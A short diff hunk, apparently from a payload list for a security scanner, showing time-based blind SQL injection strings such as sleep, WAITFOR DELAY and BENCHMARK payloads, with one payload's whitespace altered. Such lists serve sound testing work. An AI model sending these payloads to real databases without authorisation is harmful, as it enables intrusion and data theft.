@@ -10,7 +10,7 @@
 "\u0027 and sleep(12)",
 ";sleep(12)--",
 "\u0027 SELECT BENCHMARK(1200000,
-\n\n\nMD5(\u0027A\u0027));",
+\n\n\n\n\nMD5(\u0027A\u0027));",
 "\u0027 SELECT SLEEP(12); #",
 "\u0027 WAITFOR DELAY \u00270:0:12\u0027--",
 "\u0027 WAITFOR DELAY \u00270:0:12\u0027",
